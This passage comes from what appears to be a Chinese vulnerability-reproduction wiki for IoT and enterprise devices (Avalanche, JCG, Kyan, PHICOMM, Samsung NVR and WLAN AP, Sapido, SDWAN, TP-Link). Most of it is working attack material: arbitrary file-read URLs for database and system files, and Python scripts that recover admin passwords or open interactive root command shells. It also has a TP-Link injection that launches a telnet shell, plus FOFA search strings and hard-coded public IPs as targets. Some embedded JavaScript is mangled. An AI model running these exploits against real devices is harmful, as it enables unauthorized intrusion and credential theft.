request.getParameter(\"imageFilePath\"); // vulnerable GET parameter boolean cacheImage = true; String parameterIcon = request.getParameter(\"icon\"); if (paramImageFilePath != null) { File imageFile = new File(paramImageFilePath); // reading from user-input path byte[] icon = FileUtils.readFileToByteArray(imageFile); String queryString = request.getQueryString(); if (icon != null && icon.length > 0) { handleIcon(response, icon, queryString, false); // outputting the contents } else { logger.warn(String.format(\"ImageServlet::missing icon for device(%s)\", new Object[] { queryString })); } ... private void handleIcon(HttpServletResponse response, byte[] icon, String imageSource, boolean cacheImage) throws IOException { response.setContentLength(icon.length); if (cacheImage) { HttpUtils.expiresOneWeek(response); } else { HttpUtils.expiresNow(response); } ImageInputStream inputStream = ImageIO.createImageInputStream(new ByteArrayInputStream(icon)); try { Iterator imageReaders = ImageIO.getImageReaders(inputStream); if (imageReaders.hasNext()) { ImageReader reader = imageReaders.next(); String formatName = reader.getFormatName(); response.setContentType(String.format(\"image/%s\", new Object[] { formatName })); } else { logger.warn(String.format(\"ImageServlet::unknown image format for (%s)\", new Object[] { imageSource })); } } finally { try { inputStream.close(); } catch (IOException iOException) {} } ServletOutputStream outputStream = response.getOutputStream(); outputStream.write(icon); // outputting the contents of the file } 从代码中可以看出文件的访问没有限制到存储位置，允许远程攻击者为在其他地方的文件提供完整的路径并检索其内容。 EXP 访问路径https://IP:8443/AvalancheWeb/image?imageFilePath=即可，例如下载DB，如下： https://IP:8443/AvalancheWeb/image?imageFilePath=C:/Program Files/Microsoft SQL Server/MSSQL11.SQLEXPRESS/MSSQL/DATA/Avalanche.mdf https://IP:8443/AvalancheWeb/image?imageFilePath=C:/Windows/system32/config/system.sav https://IP:8443/AvalancheWeb/image?imageFilePath=C:/sysprep/sysprep.inf Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:19 "},"IOT安全/JCG/JCG路由器命令执行漏洞/JCG路由器命令执行漏洞.html":{"url":"IOT安全/JCG/JCG路由器命令执行漏洞/JCG路由器命令执行漏洞.html","title":"JCG路由器命令执行漏洞","keywords":"","body":"JCG路由器命令执行漏洞 漏洞环境 漏洞复现 Shandan上搜到相关信息 选择一个测试：http://216.171.4.173/home.asp 默认密码：admin/admin 在系统工具中可执行命令 如图 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:19 "},"IOT安全/Kyan/Kyan 网络监控设备 账号密码泄漏漏洞/Kyan 网络监控设备 账号密码泄漏漏洞.html":{"url":"IOT安全/Kyan/Kyan 网络监控设备 账号密码泄漏漏洞/Kyan 网络监控设备 账号密码泄漏漏洞.html","title":"Kyan 网络监控设备 账号密码泄漏漏洞","keywords":"","body":"Kyan 网络监控设备 账号密码泄漏漏洞 漏洞复现 FOFA: title=\"platform - Login\" 登录界面如下 POC http://xxx.xxx/hosts 成功获取账号密码 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:21 "},"IOT安全/PHICOMM/（CVE-2019-19117）PHICOMM 远程代码执行/（CVE-2019-19117）PHICOMM 远程代码执行.html":{"url":"IOT安全/PHICOMM/（CVE-2019-19117）PHICOMM 远程代码执行/（CVE-2019-19117）PHICOMM 远程代码执行.html","title":"（CVE-2019-19117）PHICOMM 远程代码执行","keywords":"","body":"一、漏洞简介 通过修改HTTP post请求中的内容，在根shell上远程执行命令。 二、漏洞影响 PHICOMM K2(PSG1218) V22.5.9.163 三、复现过程 受影响的源代码文件：/usr/lib/lua/luci/controller/admin/autoupgrade.lua 受影响的函数：save（） 漏洞详情 首先，在通过Web登录身份验证，会话劫持漏洞或弱凭据破解攻击以获取访问权限后，向设备发送精心制作的数据包 curl -i -s -k -v -X'POST' -e \"http://192.168.2.1/cgi-bin/luci/;stok=xxx/xxx/xxx/xxx\" -b \"sysauth=4a2c4bdba5fb1273ce62759fd42dba42\" --data-binary \"mode=1&autoUpTime=02%3A05|reboot\" 'http://192.168.2.1/cgi-bin/luci/;stok=xxx/admin/xxx/xxx/xxx' 在此http数据包中，我们将要执行“重新引导”的命令添加到数据包内容中。 我们可以看到，将'autoUpTime'的值直接分配给变量，而无需检查该值是否被恶意修改，然后发送给服务器。 然后，服务器直接将数据附加到命令，而无需检查数据是否也被恶意修改，从而使攻击者想要执行的命令附加到该命令。 最后，路由器将执行命令“ reboot”，这将导致DoS。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:21 "},"IOT安全/Samsung/（CVE-2017-14262）Samsung NVR devices 漏洞/（CVE-2017-14262）Samsung NVR devices 漏洞.html":{"url":"IOT安全/Samsung/（CVE-2017-14262）Samsung NVR devices 漏洞/（CVE-2017-14262）Samsung NVR devices 漏洞.html","title":"（CVE-2017-14262）Samsung NVR devices 漏洞","keywords":"","body":"（CVE-2017-14262）Samsung NVR devices 漏洞 一、漏洞简介 Samsung NVR devices是韩国三星（Samsung）公司的一款网络视频录像机设备。 Samsung NVR设备中存在安全漏洞。远程攻击者可利用该漏洞读取管理员账户的MD5密码散列，并登录设备。 二、漏洞影响 三、复现过程 poc #!/usr/bin/env python # -*- coding:utf-8 -*- from collections import OrderedDict from itertools import takewhile import requests class SamsungNVR(object): \"\"\" 此漏洞三星和 uniview 都有 \"\"\" vul_info = { \"title\": \"Samsung NVR设备安全漏洞\", \"cve\": \"CVE-2017-14262\", \"desc\": \"Samsung NVR devices是韩国三星（Samsung）公司的一款网络视频录像机设备。\" \"Samsung NVR设备中存在安全漏洞。远程攻击者可利用该漏洞读取管理员账户的MD5密码散列，并登录设备。\" } pass_index = OrderedDict( [(1, 1), (9192090, 2), (1020910, 3), (25549780, 4), (24507899, 5), (16119889, 6), (9428219, 7), (2281891, 8), (10861120, 9), (15331742, 10), (22464897, 11), (24403461, 12), (13833575, 13), (16061285, 14), (10721046, 15), (16593252, 16), (22051260, 17), (16638739, 18), (6666540, 19), (9283102, 20), (18791719, 21), (25905184, 22), (2762182, 23), (12911758, 24), (21944959, 25), (10257708, 26), (894574, 27), (16004987, 28), (12850146, 29), (8043423, 30), (7835618, 31), (18372773, 32), (9417841, 33), (18658565, 34), (10330028, 35), (13289156, 36), (23739388, 37), (12401865, 38), (15005445, 39), (10176399, 40), (10776092, 41), (16860945, 42), (5353890, 43), (2688051, 44), (39030, 45), (18708319, 46), (23920727, 47), (4762271, 48), (24294435, 49), (16720763, 50), (21207445, 51), (20598600, 52), (13303854, 53), (2666164, 54), (19813766, 55), (16041010, 56), (3127839, 57), (25260962, 58), (15859882, 59), (23452596, 60), (11396657, 61), (18994119, 62), (12423246, 63), (21498126, 64), (23593931, 65), (9818447, 66), (14937061, 67), (24683641, 68), (11058089, 69), (12800298, 70), (133183, 71), (26013724, 72), (19021449, 73), (25487361, 74), (3426696, 75), (22326185, 76), (9151922, 77), (20416123, 78), (13876302, 79), (497003, 80), (18662430, 81), (7306818, 82), (24323487, 83), (26110937, 84), (5380058, 85), (21481095, 86), (9540458, 87), (14123621, 88), (6847253, 89), (7638896, 90), (22385568, 91), (1208753, 92), (15383366, 93), (24719837, 94), (26729699, 95), (3594142, 96), (371291, 97), (23345327, 98), (4415431, 99), (6477625, 100), (4733341, 101), (13423221, 102), (24215867, 103), (7503741, 104), (6390751, 105), (10192199, 106), (10352855, 107), (22393893, 108), (7198498, 109), (12838108, 110), (5515125, 111), (7229843, 112), (13872090, 113), (21671745, 114), (12457317, 115), (26153875, 116), (14327497, 117), (11382568, 118), (10132668, 119), (20086929, 120), (8117696, 121), (2098389, 122), (21553350, 123), (23391670, 124), (25350683, 125), (25970062, 126), (6959731, 127), (16338714, 128)]) @classmethod def decrypt_password(cls, json_resp): \"\"\"解密管理员账户密码\"\"\" try: au_pwd = takewhile(lambda x: x != 0, json_resp[\"au32LoginPasswd\"]) password = \"\".join(chr(cls.pass_index[pwd_int]) for pwd_int in au_pwd) except KeyError: password = \"\" return password def __init__(self, ip: str, port: int): self._base_url = f\"http://{ip}:{port}\" def verify(self): vul_path = '/cgi-bin/main-cgi?json={\"cmd\":201,\"szUserName_Qry\":\"admin\",\"szUserName\":\"\",\"u32UserLoginHandle\":0}' url = self._base_url + vul_path try: req = requests.get(url, timeout=10) if req.status_code == 200: res_json = req.json() hash_pass = res_json.get(\"szLoginPasswd\", \"\") if hash_pass: plain_pass = self.decrypt_password(res_json) if plain_pass: return {\"user\": \"admin\", \"password\": plain_pass} except Exception as e: print(e) if __name__ == '__main__': vul = SamsungNVR(\"117.158.178.49\", 84) vulres = vul.verify() print(f\"[-] {vul.vul_info}\") if vulres: print(f\"[+] 存在漏洞:{vulres}\") else: print(\"[-] 不存在漏洞。\") Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:23 "},"IOT安全/Samsung/三星 WLAN AP WEA453e路由器 远程命令执行漏洞/三星 WLAN AP WEA453e路由器 远程命令执行漏洞.html":{"url":"IOT安全/Samsung/三星 WLAN AP WEA453e路由器 远程命令执行漏洞/三星 WLAN AP WEA453e路由器 远程命令执行漏洞.html","title":"三星 WLAN AP WEA453e路由器 远程命令执行漏洞","keywords":"","body":"三星 WLAN AP WEA453e路由器 远程命令执行漏洞 漏洞描述 三星 WLAN AP WEA453e路由器 存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限 漏洞影响 三星 WLAN AP WEA453e路由器 FOFA title==\"Samsung WLAN AP\" 漏洞复现 登录页面如下 请求包如下 POST /(download)/tmp/a.txt HTTP/1.1 Host: 175.199.182.152 Connection: close Content-Length: 48 command1=shell:cat /etc/passwd| dd of=/tmp/a.txt 漏洞利用POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 三星 WLAN AP WEA453e路由器 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:cat /etc/passwd| dd of=/tmp/a.txt\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"root\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 目标 {} 存在漏洞, 响应为:\\n{}\\033[0m\".format(target_url, response.text)) while True: cmd = str(input(\"\\033[35mCmd >>> \\033[0m\")) POC_2(target_url, cmd) else: print(\"\\033[31m[x] 目标 {} 不存在默认管理员弱口令 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:{}| dd of=/tmp/a.txt\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[36m{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Samsung_WLAN_AP_wea453e_router_RCE Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:22 "},"IOT安全/Sapido/Sapido多款路由器命令执行漏洞&突破/Sapido多款路由器命令执行漏洞&突破.html":{"url":"IOT安全/Sapido/Sapido多款路由器命令执行漏洞&突破/Sapido多款路由器命令执行漏洞&突破.html","title":"Sapido多款路由器命令执行漏洞&突破","keywords":"","body":"Sapido多款路由器命令执行漏洞&突破 一、漏洞简介 二、漏洞影响 BR270n-v2.1.03 BRC76n-v2.1.03 GR297-v2.1.3 RB1732-v2.0.43 之前的版本存在命令执行漏洞 三、复现过程 0x01 固件环境模拟 0x02 binwalk解压固件 0x03 查看web容器 对于嵌入式设备而言，很多服务都是移植开源的，/etc/init.d文件夹下是路由器启动时的加载项，在这些文件中可以看到很多的启动服务等，但是在这里我没有发现web容器的启动项，猜测可能厂商进行了二次开发 0x04 查找http服务模块 在这里可以看到很多关于http的，我们不去关注web网页出现的。因为我们想要知道这款路由器的web容器是其中，所以我们把重点放在前面的elf文件处，在这里我们看到一个cm的elf文件，如果知道开源的web服务器boa可能猜到一些，下面就是boa的架构 可以这里清晰的看到web层的英文如何状语从句：底层通过boa进行交互的。那么对于不知道的容器我们又该如何去分析呢？继续我们去分析剩下的elf程序，名字通过逐个状语从句：我们分析在sysconf程序中发现了http请求的处理方式，使用ghidra来分析sysconf 通过全文搜索定位http到关键函数，在这里我们发现了一个关键的函数apmib_get通过猜测也能大概猜到这是一个关于获取的函数，通过google可以搜索到这个函数，会发现这个函数是关于web开源服务器的boa用到的函数，到那么这里我们就已经确认这款路由器的web容器的英文boa了。既然已经知道了boa，肯定那么这个知道有框架一个关键的文件syscmd.htm文件，可以执行系统命令，由于但是这款路由器的英文asp写的所以我们只进行检索syscmd 这里可以发现两个文件，一个elf文件，一个asp文件，打开asp文件 在这里可以抛光页面可以执行系统命令 0x05 通过url访问指定页面 发现可以执行系统命令，那么这里又是如何处理的呢？ 通过上面的asp文件可以知道，对于输入的命令处理应该和formSysCmd有关联，这里我们进行grep搜索 可以看到一个webs的elf文件，那么可以猜测这里可能就是syscmd执行的临时文件了 0x06 分析webs文件 上面就是整个命令执行的逐步实现方式了，第一个图片可以看到使用system函数执行输入的系统命令，第二个图片可以裁剪将执行的结果通过cat输入到/web/obama.dat文件中，最后将obama.dat中的内容输入到web界面的文本框里。 0x07 poc ``` Exploit Title: SAPIDO RB-1732 command line execution Date: 2019-6-24 Exploit Author: k1nm3n.aotoi Vendor Homepage: http://www.sapido.com.tw/ Software Link: http://www.sapido.com.tw/CH/data/Download/firmware/rb1732/tc/RB-1732_TC_v2.0.43.bin Version: RB-1732 V2.0.43 Tested on: linux import requests import sys def test_httpcommand(ip, command): my_data = {'sysCmd': command, 'apply': 'Apply', 'submit-url':'/syscmd.asp', 'msg':''} r = requests.post('http://%s/goform/formSysCmd' % ip, data = my_data) content = r.text content = content[ content.find('')+56: content.rfind(' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:24 "},"IOT安全/SDWAN智能网关应用系统/SDWAN智能网关应用系统默认弱口令和后台多个漏洞/SDWAN智能网关应用系统默认弱口令和后台多个漏洞.html":{"url":"IOT安全/SDWAN智能网关应用系统/SDWAN智能网关应用系统默认弱口令和后台多个漏洞/SDWAN智能网关应用系统默认弱口令和后台多个漏洞.html","title":"SDWAN智能网关应用系统默认弱口令和后台多个漏洞","keywords":"","body":"SDWAN智能网关应用系统弱口令和后台任意文件上传等漏洞 漏洞描述 SDWAN智能网关应用系统自爆弱口令，后台任意文件上传，命令执行等等漏洞 漏洞影响 SDWAN智能网关应用系统 FOFA \"”unierm_brand/logo.png”\" 漏洞复现 1）登录界面 2）登录处程序员直接把默认口令给到了咱们，直接用默认口令登录进去 3）后台有很多功能，大家自己测吧。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:27 "},"IOT安全/TP-Link/（CVE-2017-16957）TP-Link 命令注入漏洞/（CVE-2017-16957）TP-Link 命令注入漏洞.html":{"url":"IOT安全/TP-Link/（CVE-2017-16957）TP-Link 命令注入漏洞/（CVE-2017-16957）TP-Link 命令注入漏洞.html","title":"（CVE-2017-16957）TP-Link 命令注入漏洞","keywords":"","body":"一、漏洞简介 TP-Link TL-WVR等都是中国普联（TP-LINK）公司的无线路由器产品。 多款TP-Link产品中存在命令注入漏洞。远程攻击者可通过向cgi-bin/luci发送face字段中带有shell元字符的admin/diagnostic命令利用该漏洞执行任意命令。 二、漏洞影响 TP-LINK TL-WVR TP-LINK TL-WVR300 v4 TP-LINK TL-WVR302 v2 TP-LINK TL-WVR450 TP-LINK TL-WVR450L TP-LINK TL-WVR450G v5 TP-LINK TL-WVR458 TP-LINK TL-WVR458L TP-LINK TL-WVR458P TP-LINK TL-WVR900G v3 TP-LINK TL-WVR1200L TP-LINK TL-WVR900L TP-LINK TL-WVR1300L TP-LINK TL-WVR1300G TP-LINK TL-WVR1750L TP-LINK TL-WVR2600L TP-LINK TL-WVR4300L TP-LINK TL-WAR450 TP-LINK TL-WAR302 TP-LINK TL-WAR2600L TP-LINK TL-WAR1750L TP-LINK TL-WAR1300L TP-LINK TL-WAR1200L TP-LINK TL-WAR900L TP-LINK TL-WAR458 TP-LINK TL-WAR450L TP-LINK TL-ER5510G v2 TP-LINK TL-ER5510G v3 TP-LINK TL-ER5520G v2 TP-LINK TL-ER5520G v3 TP-LINK TL-ER6120G v2 TP-LINK TL-ER6520G v2 TP-LINK TL-ER6520G v3 TP-LINK TL-ER3210G TP-LINK TL-ER7520G TP-LINK TL-ER6520G TP-LINK TL-ER6510G TP-LINK TL-ER6220G TP-LINK TL-ER6120G TP-LINK TL-ER6110G TP-LINK TL-ER5120G TP-LINK TL-ER5110G TP-LINK TL-ER3220G TP-LINK TL-R479P-AC TP-LINK TL-R478G+ TP-LINK TL-R478G TP-LINK TL-R478+ TP-LINK TL-R478 TP-LINK TL-R473GP-AC TP-LINK TL-R473P-AC TP-LINK TL-R473G TP-LINK TL-R473 TP-LINK TL-R4299G TP-LINK TL-R4239G TP-LINK TL-R4149G TP-LINK TL-R488 TP-LINK TL-R483 TP-LINK TL-R483G TP-LINK TL-R479GP-AC TP-LINK TL-R479GPE-AC 三、复现过程 POST /cgi-bin/luci/;stok=ea2178b4514da7ae227f4ec192536930/admin/diagnostic?form=diag HTTP/1.1 Host: 0-sec.org Content-Length: 370 Accept: application/json, text/javascript, */*; q=0.01 Origin: http://192.168.3.1 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Referer: http://192.168.3.1/webpages/index.html Accept-Encoding: gzip, deflate Cookie: sysauth=be9b6f2b4b9a76a8a658e108c6197f2c Connection: close data=%7B%22method%22%3A%22start%22%2C%22params%22%3A%7B%22type%22%3A%220%22%2C%22type_hidden%22%3A%220%22%2C%22ipaddr_ping%22%3A%22baidu.com%22%2C%22iface_ping%22%3A%22WAN1%22%2C%22ipaddr%22%3A%22baidu.com%22%2C%22iface%22%3A%22%3Btelnetd+-p+24+-l+/bin/sh%22%2C%22count%22%3A%221%22%2C%22pktsize%22%3A%2264%22%2C%22my_result%22%3A%22The+Router+is+ready.%5Cr%5Cn%22%7D%7D 漏洞脚本 # Tested product: TL-WVR450L # Hardware version：V1.0 # Firmware version: 20161125 # The RSA_Encryption_For_Tplink.js is use for Rsa Encryption to the password when login the web manager. # You can download the RSA_Encryption_For_Tplink.js by https://github.com/coincoin7/Wireless-Router-Vulnerability/blob/master/RSA_Encryption_For_Tplink.js import execjs import requests import json import urllib def read_js(): file = open(\"./RSA_Encryption_For_Tplink.js\", 'r') line = file.readline() js = '' while line: js = js + line line = file.readline() file.close() return js def execute(ip, port, username, passwd, cmd): try: s = requests.session() uri = \"http://{}:{}\".format(ip,port) headers = { 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://{}/webpages/login.html'.format(ip) } payload = { \"method\":\"get\" } ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({\"data\":json.dumps(payload)}), headers=headers, timeout=5) rsa_public_n = json.loads(ret.text)['result']['password'][0].encode(\"utf-8\") rsa_public_e = json.loads(ret.text)['result']['password'][1].encode(\"utf-8\") js = read_js() js_handle = execjs.compile(js) password = js_handle.call('MainEncrypt', rsa_public_n, rsa_public_e, passwd) payload = { \"method\":\"login\", \"params\":{ \"username\":\"{}\".format(username), \"password\":\"{}\".format(password) } } ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({\"data\":json.dumps(payload)}), headers=headers, timeout=5) stok = json.loads(ret.text)['result']['stok'].encode('utf-8') cookie = ret.headers['Set-Cookie'] print '[+] Login success' print '[+] Get The Token: ' + stok print '[+] Get The Cookie: ' + cookie headers = { 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 'Referer':'http://{}/webpages/login.html'.format(ip), 'Cookie':'{}'.format(cookie) } payload = { \"method\":\"start\", \"params\":{ \"type\":\"0\", \"type_hidden\":\"0\", \"ipaddr_ping\":\"127.0.0.1\", \"iface_ping\":\"WAN1\", \"ipaddr\":\"127.0.0.1\", \"iface\":\";{}\".format(cmd), \"count\":\"1\", \"pktsize\":\"64\", \"my_result\":\"exploit\" } } ret = s.post(uri + '/cgi-bin/luci/;stok={}/admin/diagnostic?form=diag'.format(stok), data=urllib.urlencode({\"data\":json.dumps(payload)}), headers=headers, timeout=5) #print ret.text print '[+] Finish RCE' print '--------------------------------------------------------------' return True except: return False if __name__=='__main__': print '-----------Tplink LUCI diagnostic Authenticated RCE-----------' print execute('192.168.1.1', 80, 'admin', 'admin', 'telnetd -p 24 -l /bin/sh') RSA_Encryption_For_Tplink.js 文件 // Copyright (c) 2005 Tom Wu // All Rights Reserved. // See \"LICENSE\" for details. // Basic JavaScript BN library - subset useful for RSA encryption. // Bits per digit // JavaScript engine analysis var BI_RC = new Array(); var BI_RM = \"0123456789abcdefghijklmnopqrstuvwxyz\"; var dbits; var canary = 0xdeadbeefcafe; var j_lm = ((canary&0xffffff)==0xefcafe); var rng_psize = 256; var rng_state; var rng_pool; var rng_pptr; // Initialize the pool with junk if needed. BigInteger.prototype.am = am2; dbits = 30; BigInteger.prototype.DB = dbits; BigInteger.prototype.DM = ((1= 0) { var v = x*this[i++]+w[j]+c; c = Math.floor(v/0x4000000); w[j++] = v&0x3ffffff; } return c; } // am2 avoids a big mult-and-extract completely. // Max digit bits should be >15; while(--n >= 0) { var l = this[i]&0x7fff; var h = this[i++]>>15; var m = xh*l+h*xl; l = xl*l+((m&0x7fff)>>30)+(m>>>15)+xh*h+(c>>>30); w[j++] = l&0x3fffffff; } return c; } // Alternately, set max digit bits to 28 since some // browsers slow down when dealing with 32-bit numbers. function am3(i,x,w,j,c,n) { var xl = x&0x3fff, xh = x>>14; while(--n >= 0) { var l = this[i]&0x3fff; var h = this[i++]>>14; var m = xh*l+h*xl; l = xl*l+((m&0x3fff)>28)+(m>>14)+xh*h; w[j++] = l&0xfffffff; } return c; } function int2char(n) { return BI_RM.charAt(n); } function intAt(s,i) { var c = BI_RC[s.charCodeAt(i)]; return (c==null)?-1:c; } // (protected) copy this to r function bnpCopyTo(r) { for(var i = this.t-1; i >= 0; --i) r[i] = this[i]; r.t = this.t; r.s = this.s; } // (protected) set from integer value x, -DV 0) this[0] = x; else if(x = 0) { var x = (k==8)?s[i]&0xff:intAt(s,i); if(x this.DB) { this[this.t-1] |= (x&((1>(this.DB-sh)); } else this[this.t-1] |= x= this.DB) sh -= this.DB; } if(k == 8 && (s[0]&0x80) != 0) { this.s = -1; if(sh > 0) this[this.t-1] |= ((1 0 && this[this.t-1] == c) --this.t; } // (public) return string representation in given radix function bnToString(b) { if(this.s 0) { if(p >p) > 0) { m = true; r = int2char(d); } while(i >= 0) { if(p >(p+=this.DB-k); } else { d = (this[i]>>(p-=k))&km; if(p 0) m = true; if(m) r += int2char(d); } } return m?r:\"0\"; } // (public) -this function bnNegate() { var r = nbi(); BigInteger.ZERO.subTo(this,r); return r; } // (public) |this| function bnAbs() { return (this.s a, - if this = 0) if((r=this[i]-a[i]) != 0) return r; return 0; } // returns bit length of the integer x function nbits(x) { var r = 1, t; if((t=x>>>16) != 0) { x = t; r += 16; } if((t=x>>8) != 0) { x = t; r += 8; } if((t=x>>4) != 0) { x = t; r += 4; } if((t=x>>2) != 0) { x = t; r += 2; } if((t=x>>1) != 0) { x = t; r += 1; } return r; } // (public) return the number of bits in \"this\" function bnBitLength() { if(this.t = 0; --i) r[i+n] = this[i]; for(i = n-1; i >= 0; --i) r[i] = 0; r.t = this.t+n; r.s = this.s; } // (protected) r = this >> n*DB function bnpDRShiftTo(n,r) { for(var i = n; i = 0; --i) { r[i+ds+1] = (this[i]>>cbs)|c; c = (this[i]&bm)= 0; --i) r[i] = 0; r[ds] = c; r.t = this.t+ds+1; r.s = this.s; r.clamp(); } // (protected) r = this >> n function bnpRShiftTo(n,r) { r.s = this.s; var ds = Math.floor(n/this.DB); if(ds >= this.t) { r.t = 0; return; } var bs = n%this.DB; var cbs = this.DB-bs; var bm = (1>bs; for(var i = ds+1; i >bs; } if(bs > 0) r[this.t-ds-1] |= (this.s&bm)>= this.DB; } if(a.t >= this.DB; } c += this.s; } else { c += this.s; while(i >= this.DB; } c -= a.s; } r.s = (c 0) r[i++] = c; r.t = i; r.clamp(); } // (protected) r = this * a, r != this,a (HAC 14.12) // \"this\" should be the larger one if appropriate. function bnpMultiplyTo(a,r) { var x = this.abs(), y = a.abs(); var i = x.t; r.t = i+y.t; while(--i >= 0) r[i] = 0; for(i = 0; i = 0) r[i] = 0; for(i = 0; i = x.DV) { r[i+x.t] -= x.DV; r[i+x.t+1] = 1; } } if(r.t > 0) r[r.t-1] += x.am(i,x[i],r,2*i,0,1); r.s = 0; r.clamp(); } // (protected) divide this by m, quotient and remainder to q, r (HAC 14.20) // r != q, this != m. q or r may be null. function bnpDivRemTo(m,q,r) { var pm = m.abs(); if(pm.t 0) { pm.lShiftTo(nsh,y); pt.lShiftTo(nsh,r); } else { pm.copyTo(y); pt.copyTo(r); } var ys = y.t; var y0 = y[ys-1]; if(y0 == 0) return; var yt = y0*(11)?y[ys-2]>>this.F2:0); var d1 = this.FV/yt, d2 = (1= 0) { r[r.t++] = 1; r.subTo(t,r); } BigInteger.ONE.dlShiftTo(ys,t); t.subTo(y,y); // \"negative\" y so we can replace sub with am later while(y.t = 0) { // Estimate quotient digit var qd = (r[--i]==y0)?this.DM:Math.floor(r[i]*d1+(r[i-1]+e)*d2); if((r[i]+=y.am(0,qd,r,j,0,ys)) 0) r.rShiftTo(nsh,r); // Denormalize remainder if(ts 0) a.subTo(r,r); return r; } // Modular reduction using \"classic\" algorithm function Classic(m) { this.m = m; } function cConvert(x) { if(x.s = 0) return x.mod(this.m); else return x; } function cRevert(x) { return x; } function cReduce(x) { x.divRemTo(this.m,null,x); } function cMulTo(x,y,r) { x.multiplyTo(y,r); this.reduce(r); } function cSqrTo(x,r) { x.squareTo(r); this.reduce(r); } // (protected) return \"-1/this % 2^DB\"; useful for Mont. reduction // justification: // xy == 1 (mod m) // xy = 1+km // xy(2-xy) = (1+km)(1-km) // x[y(2-xy)] = 1-k^2m^2 // x[y(2-xy)] == 1 (mod m^2) // if y is 1/x mod m, then y(2-xy) is 1/x mod m^2 // should reduce x and y(2-xy) by m^2 at each step to keep size bounded. // JS multiply \"overflows\" differently from C/C++, so care is needed here. function bnpInvDigit() { if(this.t 0)?this.DV-y:-y; } // Montgomery reduction function Montgomery(m) { this.m = m; this.mp = m.invDigit(); this.mpl = this.mp&0x7fff; this.mph = this.mp>>15; this.um = (1 0) this.m.subTo(r,r); return r; } // x/R mod m function montRevert(x) { var r = nbi(); x.copyTo(r); this.reduce(r); return r; } // x = x/R mod m (HAC 14.32) function montReduce(x) { while(x.t >15)*this.mpl)&this.um)= x.DV) { x[j] -= x.DV; x[++j]++; } } x.clamp(); x.drShiftTo(this.m.t,x); if(x.compareTo(this.m) >= 0) x.subTo(this.m,x); } // r = \"x^2/R mod m\"; x != r function montSqrTo(x,r) { x.squareTo(r); this.reduce(r); } // r = \"xy/R mod m\"; x,y != r function montMulTo(x,y,r) { x.multiplyTo(y,r); this.reduce(r); } // (protected) true iff this is even function bnpIsEven() { return ((this.t>0)?(this[0]&1):this.s) == 0; } // (protected) this^e, e 0xffffffff || e = 0) { z.sqrTo(r,r2); if((e&(1 0) z.mulTo(r2,g,r); else { var t = r; r = r2; r2 = t; } } return z.revert(r); } // (public) this^e % m, 0 > 8) & 255; rng_pool[rng_pptr++] ^= (x >> 16) & 255; rng_pool[rng_pptr++] ^= (x >> 24) & 255; if(rng_pptr >= rng_psize) rng_pptr -= rng_psize; } // Mix in the current time (w/milliseconds) into the pool function rng_seed_time() { rng_seed_int(new Date().getTime()); } function rng_get_byte() { if(rng_state == null) { rng_seed_time(); rng_state = prng_newstate(); rng_state.init(rng_pool); for(rng_pptr = 0; rng_pptr = 0 && n > 0) { var c = s.charCodeAt(i--); if(c 127) && (c > 6) | 192; } else { ba[--n] = (c & 63) | 128; ba[--n] = ((c >> 6) & 63) | 128; ba[--n] = (c >> 12) | 224; } } ba[--n] = 0; var rng = new SecureRandom(); var x = new Array(); while(n > 2) { // random non-zero pad x[0] = 0; while(x[0] == 0) rng.nextBytes(x); ba[--n] = x[0]; } ba[--n] = 2; ba[--n] = 0; return new BigInteger(ba); } function nopadding(s,n) { if(n 127) && (c > 6) | 192; }else{ ba[j++] = (c & 63) | 128; ba[j++] = ((c >> 6) & 63) | 128; ba[j++] = (c >> 12) | 224; } }; while (j 0 && E.length > 0) { this.n = parseBigInt(N,16); this.e = parseInt(E,16); } 